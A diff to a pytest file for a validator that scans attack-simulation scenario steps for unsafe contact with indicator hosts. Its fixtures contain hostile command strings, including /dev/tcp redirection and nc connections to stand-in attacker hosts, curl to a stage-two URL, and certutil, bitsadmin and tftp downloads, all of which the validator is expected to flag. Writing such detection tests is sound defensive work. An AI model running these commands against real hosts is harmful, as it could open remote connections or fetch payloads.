@@ -62,7 +62,7 @@ def test_s27_safe_form_must_fit_type():
 def test_s24_surfaces_in_must_name_existing_steps():
     ind = IndicatorSchema(**_ind(surfaces_in=["step-09"]))
     with pytest.raises(ValueError, match="S-24"):
-        _scenario(indicators=[ind.model_dump()], steps=[_step("dig +short rn-stage.example")])
+        _scenario(indicators=[ind.model_dump()], steps=[_step("dig +short rn-stage.example @${LAB_RESOLVER:-127.0.0.53}")])
     with pytest.raises(ValueError, match="S-24"):
         IndicatorSchema(**_ind(surfaces_in=[]))
 
@@ -79,7 +79,7 @@ def test_s25_domain_outside_dns_lookup_or_params_is_rejected(cmd):
 
 @pytest.mark.parametrize("cmd", [
     "dig +short rn-stage.example @${LAB_RESOLVER:-1.1.1.1}",
-    "nslookup rn-stage.example", "getent hosts rn-stage.example", "resolvectl query rn-stage.example",
+    "nslookup rn-stage.example $env:LAB_RESOLVER",
     "cat > /tmp/c.yml <<YML\nsteps:\n  - plugin: ngfw_eal_emitter\n    params:\n      dst_domain: rn-stage.example\n      dst_ip: 203.0.113.9\nYML",
 ])
 def test_s25_allows_dns_lookup_lines_and_params_block(cmd):
@@ -110,7 +110,7 @@ def test_scenario_validator_raises_on_unsafe_surfacing():
 
 
 def test_indicators_persist_and_default_empty():
-    s = _scenario(indicators=[_ind()], steps=[_step("dig +short rn-stage.example")])
+    s = _scenario(indicators=[_ind()], steps=[_step("dig +short rn-stage.example @${LAB_RESOLVER:-127.0.0.53}")])
     assert _schema_to_orm_kwargs(s)["indicators"][0]["value"] == "rn-stage.example"
     assert _schema_to_orm_kwargs(_scenario(steps=[_step("id")]))["indicators"] == []
 
@@ -160,7 +160,7 @@ def test_cleanup_commands_are_scanned():
 
 def test_scenario_validator_scans_cleanup():
     with pytest.raises(ValueError, match="S-25"):
-        _scenario(indicators=[_ind()], steps=[_step("dig +short rn-stage.example")],
+        _scenario(indicators=[_ind()], steps=[_step("dig +short rn-stage.example @${LAB_RESOLVER:-127.0.0.53}")],
                   cleanup={"commands": ["curl https://rn-stage.example/x"]})
 
 
@@ -187,7 +187,7 @@ def test_id_must_be_exactly_two_digits_and_unique():
     with pytest.raises(ValueError, match="S-22"):
         IndicatorSchema(**_ind(id="ind-001"))
     with pytest.raises(ValueError, match="S-22"):
-        _scenario(indicators=[_ind(), _ind()], steps=[_step("dig +short rn-stage.example")])
+        _scenario(indicators=[_ind(), _ind()], steps=[_step("dig +short rn-stage.example @${LAB_RESOLVER:-127.0.0.53}")])
 
 
 def test_url_indicator_is_case_insensitive():
@@ -198,7 +198,7 @@ def test_url_indicator_is_case_insensitive():
 # ── Task 6b: fetch verb is a command token, not a hostname substring ─────────
 @pytest.mark.parametrize("cmd,value", [
     ("dig +short npm-cache.example @${LAB_RESOLVER:-127.0.0.53}", "npm-cache.example"),
-    ("host curl.example", "curl.example"),
+    ("host curl.example ${LAB_RESOLVER}", "curl.example"),
 ])
 def test_fetch_verb_inside_hostname_does_not_block_lookup(cmd, value):
     ind = IndicatorSchema(**_ind(value=value))
@@ -230,3 +230,146 @@ def test_fetch_verb_tokens_still_fire_s26(cmd, fires):
 def test_lookup_piped_into_fetch_verb_still_fires_s25():
     ind = IndicatorSchema(**_ind())
     assert _s25(unsafe_indicator_lines([ind], [StepSchema(**_step("dig +short rn-stage.example | xargs curl -s"))]))
+
+
+# ── Final review: tightened S-25 (I1 / I2 / M2 / M3 / M4) + in_band ──────────
+_EVIL = dict(value="evil.example")
+_IP4 = dict(type="ipv4", value="203.0.113.9", safe_form="log_field")
+_RES = "@${LAB_RESOLVER:-127.0.0.53}"
+
+
+def _lines(ind_kw, cmd):
+    return unsafe_indicator_lines([IndicatorSchema(**_ind(**ind_kw))], [StepSchema(**_step(cmd))])
+
+
+@pytest.mark.parametrize("ind_kw,cmd", [
+    # I1a — redirection / background / process substitution are chaining
+    (_EVIL, "dig evil.example >/dev/tcp/203.0.113.9/443"),
+    (_EVIL, f"dig evil.example {_RES} >/dev/tcp/203.0.113.9/443"),
+    (_EVIL, f"dig evil.example {_RES} > /tmp/out"),
+    (_EVIL, f"dig evil.example {_RES} < /tmp/in"),
+    (_EVIL, "dig evil.example & nc evil.example 443"),
+    (_EVIL, f"dig evil.example {_RES} & nc evil.example 443"),
+    (_EVIL, "dig evil.example <(nc 203.0.113.9 80)"),
+    (_EVIL, f"dig evil.example {_RES} <(nc 203.0.113.9 80)"),
+    (_EVIL, f"dig evil.example {_RES} >(nc 203.0.113.9 80)"),
+    # I1b — only domain values are exempt on a lookup line
+    (_IP4, "dig @203.0.113.9 evil.example"),
+    (_IP4, f"dig -x 203.0.113.9 {_RES}"),
+    # I1c — a lookup line must name a resolver
+    (_EVIL, "dig +short evil.example"),
+    (_EVIL, "nslookup evil.example"),
+    (_EVIL, "getent hosts evil.example"),
+    (_EVIL, "resolvectl query evil.example"),
+    # the named resolver may not be the indicator itself
+    (_EVIL, "dig +short evil.example @evil.example"),
+    (_EVIL, "dig +short x.example @ns1.evil.example"),
+])
+def test_final_s25_lookup_exemption_tightened(ind_kw, cmd):
+    assert _s25(_lines(ind_kw, cmd)), cmd
+
+
+@pytest.mark.parametrize("cmd", [
+    f"dig +short evil.example {_RES}",
+    "nslookup evil.example $env:LAB_RESOLVER",
+    "host evil.example ${LAB_RESOLVER}",
+])
+def test_final_s25_lookup_with_resolver_allowed(cmd):
+    assert _lines(_EVIL, cmd) == []
+
+
+def _campaign(plugin_lines, params):
+    return "cat > /tmp/c.yml <<YML\nsteps:\n" + "".join(
+        f"  - plugin: {p}\n    params:\n" + "".join(f"      {k}: {v}\n" for k, v in params.items())
+        for p in plugin_lines) + "YML"
+
+
+@pytest.mark.parametrize("ind_kw,cmd", [
+    (_IP4, "bash <<'EOF'\nparams:\n  curl http://203.0.113.9/x\nEOF"),
+    (_IP4, _campaign(["c2_http_beacon"], {"target_url": "http://203.0.113.9/"})),
+    (_IP4, _campaign(["dns_tunnel_exfil"], {"dst_ip": "203.0.113.9"})),
+    (_IP4, _campaign(["mystery_plugin"], {"dst_ip": "203.0.113.9"})),
+    (_IP4, _campaign(["ngfw_eal_emitter", "c2_http_beacon"], {"dst_ip": "203.0.113.9"})),
+    (_IP4, "cat > /tmp/c.yml <<YML\nparams:\n  dst_ip: 203.0.113.9\nYML"),  # no plugin
+    (_IP4, "cat > /tmp/c.json <<YML\nsteps:\n  - plugin: ngfw_eal_emitter\n    params:\n"
+           "      dst_ip: 203.0.113.9\nYML"),  # not a .yml campaign file
+    (_IP4, "tee /tmp/c.yml <<YML\nsteps:\n  - plugin: ngfw_eal_emitter\n    params:\n"
+           "      dst_ip: 203.0.113.9\nYML"),
+])
+def test_final_s25_params_exemption_only_for_collector_campaign_files(ind_kw, cmd):
+    assert _s25(_lines(ind_kw, cmd)), cmd
+
+
+@pytest.mark.parametrize("plugin", sorted([
+    "ngfw_eal_emitter", "ngfw_threat_emitter", "cloud_audit_emitter", "idp_signin_emulator",
+    "email_emitter", "third_party_vpn_emitter"]))
+def test_final_s25_params_exemption_allows_collector_streamers(plugin):
+    assert _lines(_IP4, _campaign([plugin], {"dst_ip": "203.0.113.9"})) == []
+    assert _lines(_IP4, _campaign([plugin], {"dst_ip": "203.0.113.9"}).replace(
+        "cat > /tmp/c.yml <<YML", "cat > \"$WORK/campaign.yaml\" <<'YML'")) == []
+
+
+def test_final_collector_post_plugins_exact():
+    from engine.scenario_loader import COLLECTOR_POST_PLUGINS  # noqa: PLC0415
+    assert COLLECTOR_POST_PLUGINS == frozenset({
+        "ngfw_eal_emitter", "ngfw_threat_emitter", "cloud_audit_emitter",
+        "cloud_storage_compute_emitter", "azure_audit_emitter", "k8s_audit_emitter",
+        "m365_activity_emitter", "ad_windows_emitter", "idp_signin_emulator", "email_emitter",
+        "duo_auth_emitter", "globalprotect_emitter", "third_party_alert_emitter",
+        "third_party_firewall_emitter", "third_party_vpn_emitter"})
+
+
+@pytest.mark.parametrize("ind_kw,cmd,fires", [
+    # M2 — a here-string is not a heredoc
+    (_IP4, "cat > /tmp/c.yml <<<EOF\nplugin: ngfw_eal_emitter\nparams:\n  curl http://203.0.113.9/x\nEOF", True),
+    # M2 — '<<' inside a comment opens nothing
+    (_IP4, "# cat > /tmp/c.yml <<EOF\nplugin: ngfw_eal_emitter\nparams:\n  curl http://203.0.113.9/x\nEOF", True),
+    # M2 — '<<' inside arithmetic opens nothing (the lookup below stays exempt)
+    (_EVIL, f"x=$(( FLAG << SHIFT ))\ndig +short evil.example {_RES}\nSHIFT", False),
+    (_EVIL, f"x=$((1<<4))\ndig +short evil.example {_RES}", False),
+])
+def test_final_heredoc_detection_is_anchored(ind_kw, cmd, fires):
+    assert _s25(_lines(ind_kw, cmd)) is fires
+
+
+@pytest.mark.parametrize("cmd,fires", [
+    ("curl http://evil.example/other", True),
+    ("nc evil.example 443", True),
+    (f"dig +short evil.example {_RES}", False),
+])
+def test_final_url_host_scanned_as_domain(cmd, fires):
+    kw = dict(type="url", value="https://evil.example/stage2", safe_form="log_field")
+    assert _s25(_lines(kw, cmd)) is fires
+
+
+def test_final_url_ip_host_scanned_as_ipv4():
+    kw = dict(type="url", value="http://203.0.113.9:8080/x", safe_form="log_field")
+    assert _s25(_lines(kw, "nc 203.0.113.9 8080"))
+    assert _s25(_lines(kw, f"dig -x 203.0.113.9 {_RES}"))
+
+
+@pytest.mark.parametrize("cmd,fires", [
+    ("certutil -urlcache -f https://x/{h} out.bin", True),
+    ("certutil.exe -urlcache -split -f https://x/{h}", True),
+    ("bitsadmin /transfer j https://x/{h} C:\\t\\x", True),
+    ("Start-BitsTransfer -Source https://x/{h}", True),
+    ("aria2c https://x/{h}", True),
+    ("scp user@x:/srv/{h} .", True),
+    ("tftp -g -r {h} x", True),
+    ("ftp -n x {h}", True),
+    ("ftp.example {h}", False),
+    ("sftp-helper {h}", False),
+])
+def test_final_fetch_verbs_extended(cmd, fires):
+    h = "e" * 64
+    ind = IndicatorSchema(**_ind(type="sha256", value=h, safe_form="hash_only"))
+    lines = unsafe_indicator_lines([ind], [StepSchema(**_step(cmd.format(h=h)))])
+    assert any(l.startswith("S-26") for l in lines) is fires
+
+
+def test_final_in_band_defaults_true_and_must_be_bool():
+    assert IndicatorSchema(**_ind()).in_band is True
+    assert IndicatorSchema(**_ind(in_band=False)).in_band is False
+    for bad in ("no", 0, 1, None, "false"):
+        with pytest.raises(ValueError, match="S-22"):
+            IndicatorSchema(**_ind(in_band=bad))
